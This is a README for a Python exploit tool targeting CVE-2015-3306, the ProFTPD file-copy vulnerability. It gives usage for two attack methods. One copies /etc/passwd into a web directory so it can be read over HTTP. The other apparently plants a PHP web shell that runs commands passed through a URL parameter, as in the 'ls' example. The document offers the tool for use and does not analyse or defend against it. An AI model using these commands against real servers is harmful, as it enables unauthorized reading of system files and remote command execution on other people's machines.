# cpx_proftpd

Tool coded by Daniel Aldana for [CVE-2015-3306](http://bugs.proftpd.org/show_bug.cgi?id=4169) exploitation. Bug reported by Vadim Melihow.

###METHOD 1:

usage: 

```
python cpx_proftp.py <IP> <REMOTE_FULLPATH_SRC_FILE> <REMOTE_FULLPATH_DST_FILE>
```

ex:

```
python cpx_proftp.py 127.0.0.1 /etc/passwd /var/www/pass.txt
```

then try:

```
http://127.0.0.1/pass.txt
```

###METHOD 2:


usage: 

```
python cpx_proftp.py <IP> <REMOTE_FULLPATH_WEBDIR>
```

ex:

```
python cpx_proftp.py 127.0.0.1 /var/www/html
```

then try:

```
http://127.0.0.1/xxx.php?img=ls
```
